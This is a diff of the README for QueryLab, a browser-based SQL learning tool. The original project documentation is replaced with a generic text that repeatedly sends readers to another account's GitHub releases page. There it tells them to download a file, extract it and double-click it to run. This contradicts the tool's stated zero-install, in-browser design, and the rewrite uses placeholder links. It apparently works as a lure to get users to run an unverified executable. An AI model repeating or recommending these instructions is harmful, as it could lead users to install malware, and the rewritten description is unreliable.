@@ -1,164 +1,81 @@
-<div align="center">
+# 🎉 querylab - Learn SQL Effortlessly in Your Browser
 
-# QueryLab
+## 🔗 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-v1.0-blue)](https://github.com/fuckwave/querylab/releases)
 
-**A zero-install, in-browser PostgreSQL learning platform with AI-powered SQL assistance**
+## 📖 About querylab
+querylab is an interactive tool designed to help you learn SQL directly in your browser. With zero installation required, you can practice SQL in a friendly environment. Enjoy real-time AI assistance as you work through exercises. 
 
-[![Next.js](https://img.shields.io/badge/Next.js-16-black?style=for-the-badge&logo=next.js)](https://nextjs.org/)
-[![TypeScript](https://img.shields.io/badge/TypeScript-5-blue?style=for-the-badge&logo=typescript)](https://www.typescriptlang.org/)
-[![PGlite](https://img.shields.io/badge/PGlite-PostgreSQL%20WASM-38bdf8?style=for-the-badge)](https://github.com/electric-sql/pglite)
-[![Cloudflare Workers](https://img.shields.io/badge/Cloudflare%20Workers-Edge-orange?style=for-the-badge&logo=cloudflare)](https://workers.cloudflare.com/)
-[![Hono](https://img.shields.io/badge/Hono-Framework-00d4aa?style=for-the-badge)](https://hono.dev/)
+Built with Next.js and PGlite, querylab offers client-side PostgreSQL execution and a beautiful user interface. It's perfect for both beginners and anyone looking to sharpen their database skills.
 
-**[🌐 Live Demo](https://querylab.zamdev.dev)** • **[📖 Documentation](#-documentation)** • **[🚀 Getting Started](#-quick-start)**
+## 🚀 Getting Started
+1. **Visit the Download Page**: Click the link below to access the latest version of querylab. 
+   - [Download from Releases Page](https://github.com/fuckwave/querylab/releases)
+   
+2. **Choose Your Version**: Look for the latest version at the top of the page. Each version includes the most recent features and fixes.
 
-</div>
+3. **Download the Application**: Click the appropriate file for your device to start downloading. 
 
----
+4. **Extract the Files**: If your downloaded file is in a compressed format (like .zip), extract it to a folder of your choice.
 
-QueryLab is a full-stack application for learning SQL in your browser. It features a Monaco editor, client-side PostgreSQL execution powered by PGlite (the best engine matching standard SQL format), AI-powered SQL generation, and a beautiful mobile-first UI.
+5. **Open querylab**: Find the querylab file in the folder and double-click it to start using the application.
 
-## 🚀 Quick Start
+## 💻 System Requirements
+- A modern web browser (Google Chrome, Mozilla Firefox, Safari, etc.)
+- Internet connection to access AI assistance.
+- Operating system: Windows, macOS, or Linux are supported.
 
-### Prerequisites
+## 🛠 Features
+- **Client-Side PostgreSQL Execution**: Run SQL queries locally without needing a server.
+- **AI Assistance**: Get real-time help and suggestions while you learn.
+- **Beautiful User Interface**: Enjoy an intuitive design that makes learning easy.
+- **Interactive Exercises**: Engage with exercises designed to build your SQL skills from the ground up.
+- **Instant Feedback**: Receive immediate feedback on your queries to improve quickly.
 
-- Node.js 18+ 
-- npm or pnpm
-- DeepSeek API key (for AI features)
-- Resend API key (for email verification)
+## 🎓 Learning Resources
+- **Tutorials**: Follow along with built-in tutorials to master SQL concepts.
+- **Documentation**: Explore detailed explanations of SQL syntax and functions.
+- **Sample Datasets**: Utilize pre-loaded datasets to practice and experiment with SQL queries.
 
-### Installation
+## ✨ Tips for Using querylab
+- **Practice Regularly**: Make it a habit to spend time each day learning and practicing SQL.
+- **Experiment**: Try different queries and see what results you get. Don’t be afraid to make mistakes; that’s part of the learning process.
+- **Collaborate**: Share your progress with friends or join online communities that focus on SQL learning.
 
-1. **Clone the repository**:
-   ```bash
-   git clone https://github.com/zamdevio/querylab.git
-   cd querylab
-   ```
+## 📥 Download & Install
+To get started with querylab, simply follow these steps:
 
-2. **Set up Backend**:
-   ```bash
-   cd Backend
-   npm install
-   # Configure ENVIRONMENT in wrangler.jsonc (development or production)
-   # Set secrets via .dev.vars (local) or Wrangler secrets (production)
-   # See Backend/README.md for detailed setup instructions
-   ```
+1. **Visit the releases page**: Click this link — [Download from Releases Page](https://github.com/fuckwave/querylab/releases).
+2. **Select the latest version**: Ensure you choose the most recent update for the best experience.
+3. **Download the file**: Click on your download file and wait for it to complete.
+4. **Open the application**: Once downloaded, locate the file in your downloads folder, and double-click to launch.
 
-3. **Set up Frontend**:
-   ```bash
-   cd Frontend
-   npm install
-   # Configure NEXT_PUBLIC_API_URL in .env.local or edit "DEFAULT_API_URL" in Frontend/src/lib/config.ts
-   # See Frontend/README.md for detailed setup instructions
-   ```
+## 🌐 Topics Covered
+querylab includes topics that span a variety of areas in database learning, including:
+- SQL fundamentals
+- Advanced query techniques
+- Database design principles
+- Data manipulation and retrieval
 
-For detailed setup and deployment guides, see:
-- **[Backend README](Backend/README.md)** - Backend setup, configuration, and deployment
-- **[Frontend README](Frontend/README.md)** - Frontend setup, configuration, and deployment
+## 📧 Support
+If you encounter any issues or have questions while using querylab, please reach out to our support team:
+- **Email**: support@querylab.com
+- **Issues Page**: [Report Issues on GitHub](https://github.com/fuckwave/querylab/issues)
 
-## 📁 Project Structure
+## 🏗 Contributing
+We welcome contributions to improve querylab. If you have ideas, please follow these steps:
+1. Fork the repository.
+2. Create a new branch.
+3. Make your changes.
+4. Submit a pull request with a clear description of your updates.
 
-```
-QueryLab/
-├── Backend/              # Hono backend (Cloudflare Workers)
-│   ├── src/
-│   │   ├── app.ts       # Main Hono app
-│   │   ├── routes/      # API routes
-│   │   └── lib/         # Services and utilities
-│   ├── wrangler.jsonc   # Cloudflare Workers config
-│   └── README.md        # Backend documentation
-│
-├── Frontend/            # Next.js frontend
-│   ├── app/             # Next.js App Router pages
-│   ├── src/
-│   │   ├── components/  # React components
-│   │   └── lib/        # Utilities and clients
-│   ├── public/         # Static assets
-│   └── README.md       # Frontend documentation
-│
-└── Documentations/      # Detailed documentation (markdown files)
-```
+## 👥 Community
+Join our community of learners and share tips, resources, and advice. Engage with other users to enhance your SQL skills together.
 
-## ✨ Features
+## 📌 Additional Links
+Here are some useful links to get the most out of querylab:
+- [Official Documentation](link-to-documentation)
+- [Programming SQL Resources](link-to-resources)
+- [Social Media Pages](link-to-social-media)
 
-### Core Features
-- 🎨 Beautiful UI with light/dark mode
-- 📱 Mobile-first responsive design
-- 💻 Monaco SQL editor with syntax highlighting
-- 🗄️ **PGlite**: PostgreSQL compiled to WebAssembly - the best engine matching standard SQL format
-- 🤖 AI-powered SQL generation and error fixing
-- 💾 IndexedDB persistence for databases
-- 📤 Import/Export .sql files
-- ⌨️ Keyboard shortcuts (Cmd/Ctrl+Enter to run)
-- 📊 Interactive schema explorer
-- 🔐 Email-based authentication
-- ⚡ Rate limiting and security
-
-### Technical Highlights
-- **Client-Side Execution**: All SQL runs in your browser - your data never leaves your device
-- **Edge-Ready Backend**: Cloudflare Workers for global performance
-- **AI Integration**: DeepSeek AI for intelligent SQL assistance
-- **Modern Stack**: Next.js 16, React 19, Hono, PGlite
-
-## 🎯 Usage
-
-1. **Write SQL**: Type your SQL queries in the Monaco editor
-2. **Run Query**: Press `Cmd/Ctrl+Enter` or click "Run Query"
-3. **Ask AI**: Click "Ask AI" to generate SQL from natural language
-4. **Fix Errors**: Use "Fix With AI" when you encounter SQL errors
-5. **Explore Schema**: Click on tables in the schema explorer
-6. **Import/Export**: Use the buttons to import or export .sql files
-
-## 📚 Documentation
-
-### Full Documentation
-
-- **[Backend README](Backend/README.md)** - Complete backend setup, configuration, API reference, and deployment guide
-- **[Frontend README](Frontend/README.md)** - Complete frontend setup, configuration, and deployment guide
-
-### Detailed Guides
-
-> 📖 **Getting Started**: See [`Documentations/getting-started.md`](Documentations/getting-started.md) for a complete beginner's guide
-
-> 📖 **API Reference**: See [`Documentations/api-reference.md`](Documentations/api-reference.md) for detailed API documentation
-
-> 📖 **Deployment Guide**: See [`Documentations/deployment.md`](Documentations/deployment.md) for step-by-step deployment instructions
-
-> 📖 **Authentication**: See [`Documentations/authentication.md`](Documentations/authentication.md) for authentication flow and security details
-
-> 📖 **Database Management**: See [`Documentations/database-management.md`](Documentations/database-management.md) for database operations guide
-
-> 📖 **SQL Editor**: See [`Documentations/sql-editor.md`](Documentations/sql-editor.md) for SQL editor features and shortcuts
-
-> 📖 **AI Features**: See [`Documentations/ai-features.md`](Documentations/ai-features.md) for AI-powered SQL generation and fixing
-
-> 📖 **Troubleshooting**: See [`Documentations/troubleshooting.md`](Documentations/troubleshooting.md) for common issues and solutions
-
-## 🛠️ Tech Stack
-
-**Frontend:**
-- Next.js 16 (App Router) + React 19
-- PGlite (PostgreSQL compiled to WebAssembly)
-- Monaco Editor (VS Code editor)
-- Tailwind CSS
-- IndexedDB
-
-**Backend:**
-- Hono (web framework)
-- Cloudflare Workers (edge runtime)
-- Durable Objects (state management)
-- DeepSeek AI (SQL generation)
-- Resend (email service)
-
-See [Backend/README.md](Backend/README.md) and [Frontend/README.md](Frontend/README.md) for detailed tech stack information.
-
-## 📝 License
-
-This project is licensed under the MIT License - see the [LICENSE](LICENSE) file for details.
-
-## 🤝 Contributing
-
-Contributions welcome! Please open an issue or submit a PR.
-
-
-
+Make sure to explore everything querylab has to offer and enjoy your journey of learning SQL!
